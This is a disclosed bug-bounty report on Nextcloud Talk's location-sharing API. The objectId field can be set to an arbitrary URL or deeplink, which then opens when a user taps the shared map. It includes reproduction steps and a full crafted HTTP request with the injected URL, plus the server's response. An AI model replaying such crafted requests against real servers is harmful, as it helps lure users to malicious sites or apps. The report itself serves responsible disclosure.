# objectId in share location can be set to open arbitrary URL or Deeplinks

## Report Details
- **Report ID**: 1337178
- **URL**: https://hackerone.com/reports/1337178
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-09-11T18:08:30.290Z
- **Disclosed**: 2022-03-08T16:11:41.630Z

## Reporter
- **Username**: ctulhu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:
The NextCloud Talk app allows a user to share their location in the Mobile App.
The objectId= in ```/ocs/v2.php/apps/spreed/api/v1/chat/$token/share``` Can be set to a URL or Deeplink, While the ```metaData=``` will render the map, Once a user clicked the map it will open the defined URL or Deeplink in the crafted request.

For days, I've been thinking and trying different ways to Increase its Severity but i guess im stuck so here i am Reporting this.




## Steps To Reproduce:
Note: Location Sharing is only allowed in the Mobile App.

* 1.) Using the app share your location and Intercept it, The request should be similar to the ```Request``` Below.
* 2.) Alter the ```objectId=``` to whatever URL you want to point it at.
* 3.) Send the Request
* 4.) Using the Mobile app, Click the map and it will redirect you to the url.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

### Request

  ```
POST /ocs/v2.php/apps/spreed/api/v1/chat/wqfqmw9n/share HTTP/2
Host: localhost
Cookie: oc_sessionPassphrase=cookie; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; occi3pyo3vg0=6lheeis7ot8kcnvdgq12ijl90e
Authorization: Basic 
User-Agent: Mozilla/5.0 (Android) Nextcloud-Talk v12.2.1
Accept: application/json
Ocs-Apirequest: true
Content-Type: application/x-www-form-urlencoded
Content-Length: 227
Accept-Encoding: gzip, deflate

objectType=geo-location&objectId=https://ctulhu.me&referenceId=kkk&metaData={"type":"geo-location","id":"geo:14.600765443470294,121.00452968052457","latitude":"14.600765443470294","longitude":"121.00452968052457","name":"hehe"}
```

### Response

```
HTTP/2 201 Created
Date: Sat, 11 Sep 2021 17:30:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 509
Expires: Thu, 19 Nov 1981 08:52:00 GMT


{"ocs":{"meta":{"status":"ok","statuscode":201,"message":"OK"},"data":{"id":237,"token":"wqfqmw9n","actorType":"users","actorId":"secret","actorDisplayName":"secret","timestamp":1631381422,"message":"{object}","messageParameters":{"actor":{"type":"user","id":"secret","name":"secret"},"object":{"type":"geo-location","id":"https:\/\/ctulhu.me","latitude":"14.600765443470294","longitude":"121.00452968052457","name":"hehe"}},"systemMessage":"","messageType":"comment","isReplyable":true,"referenceId":"kkk"}}}

```

## Impact

A attacker can abuse this to fool the user to open a malicious url or 3rd party app.

## Attachments
No attachments
